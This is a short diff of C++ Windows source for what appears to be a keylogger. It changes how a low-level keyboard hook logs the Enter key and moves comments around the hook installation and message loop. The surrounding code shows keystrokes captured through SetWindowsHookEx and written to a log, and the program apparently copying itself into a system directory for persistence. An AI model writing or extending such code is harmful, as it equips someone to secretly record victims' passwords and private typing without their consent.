@@ -54,7 +54,7 @@ LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam){
 			break;
 			
 			case 0xD:
-				LOG << "\n";
+				LOG << "[enter]";
 			break;
 			
 			case 0x1B:
@@ -132,7 +132,7 @@ LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam){
 //main function
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow){
 	
-	//start capturing keys
+	//hook keyboard
 	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);
 	
 	MSG message;
@@ -151,6 +151,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine,
 		cout << "moved to: " << systemPath << "\nfrom: " << pathtofile << endl;
 	}
 	
+	//start capturing keys
 	while(GetMessage(&message, NULL, 0, 0)){
 		TranslateMessage(&message);
 		DispatchMessage(&message);
